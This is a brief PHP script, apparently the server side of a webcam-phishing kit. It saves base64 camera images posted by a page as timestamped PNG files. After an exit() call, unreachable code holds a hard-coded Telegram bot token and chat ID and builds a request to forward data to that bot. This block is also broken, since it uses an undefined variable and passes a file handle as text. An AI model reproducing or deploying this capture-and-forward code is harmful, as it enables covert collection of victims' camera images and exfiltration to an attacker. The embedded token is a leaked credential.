<?php


$date = date('dMYHis');
$imageData=$_POST['cat'];
if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");

}
$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );
exit();

   
   $token = "6134286704:AAHwY_KQzUsrvMAo7FH2MEL8fGc6pba26Hg"; 
 $chat_id = "2041536580";
 $file = urlencode("Image:{$fp}");
 $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

 ?>